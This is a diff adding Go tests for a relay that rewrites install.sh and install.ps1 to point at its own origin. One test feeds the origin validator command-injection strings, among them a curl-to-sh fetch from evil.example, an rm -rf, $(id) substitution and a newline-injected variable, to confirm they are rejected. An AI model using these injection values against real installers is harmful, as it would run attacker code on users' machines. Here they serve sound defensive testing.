@@ -268,3 +268,57 @@ func TestRelayInstallerMissing(t *testing.T) {
 		t.Errorf("GET /install.ps1 without file = %d, want 503", resp.StatusCode)
 	}
 }
+
+// The whole point of a relay serving install.sh: whoever fetched it from here
+// can reach here, and often cannot reach the release page it was built for.
+func TestServedInstallerPointsAtServingRelay(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.WriteFile(filepath.Join(dir, "install.sh"),
+		[]byte("#!/bin/sh\nRELAY_SELF=\"\"\nBASE=\"https://github.example/releases\"\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "install.ps1"),
+		[]byte("$relaySelf = ''\n$base = 'https://github.example/releases'\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("WANCTL_PUBLIC_ORIGIN", "https://relay.example/")
+
+	for _, tc := range []struct{ path, want string }{
+		{"/install.sh", `RELAY_SELF="https://relay.example"`},
+		{"/install.ps1", `$relaySelf = 'https://relay.example'`},
+	} {
+		rec := httptest.NewRecorder()
+		installerHandler(dir, strings.TrimPrefix(tc.path, "/"), "text/plain", installerOrigin())(
+			rec, httptest.NewRequest(http.MethodGet, "http://relay.internal"+tc.path, nil))
+		if rec.Code != http.StatusOK {
+			t.Fatalf("%s: status = %d", tc.path, rec.Code)
+		}
+		if !strings.Contains(rec.Body.String(), tc.want) {
+			t.Fatalf("%s: served installer not localized:\n%s", tc.path, rec.Body.String())
+		}
+	}
+}
+
+// The origin is spliced into two scripts that then get executed, so anything
+// that would end the string literal must disable the rewrite rather than land
+// in the file. An installer left alone still works via WANCTL_RELAY.
+func TestInstallerOriginRejectsUnsafeValues(t *testing.T) {
+	for _, bad := range []string{
+		"https://relay.example\"; curl evil.example | sh; #",
+		"https://relay.example' ; rm -rf /tmp/x ; '",
+		"https://relay.example`id`",
+		"https://relay.example $(id)",
+		"https://relay.example\nRELAY_SELF=https://evil.example",
+		"ftp://relay.example",
+		"not-a-url",
+	} {
+		t.Setenv("WANCTL_PUBLIC_ORIGIN", bad)
+		if got := installerOrigin(); got != "" {
+			t.Errorf("installerOrigin(%q) = %q, want empty", bad, got)
+		}
+	}
+	body := []byte("RELAY_SELF=\"\"\n")
+	if out := localizeInstaller(body, "install.sh", ""); string(out) != string(body) {
+		t.Fatalf("empty origin rewrote the installer: %q", out)
+	}
+}
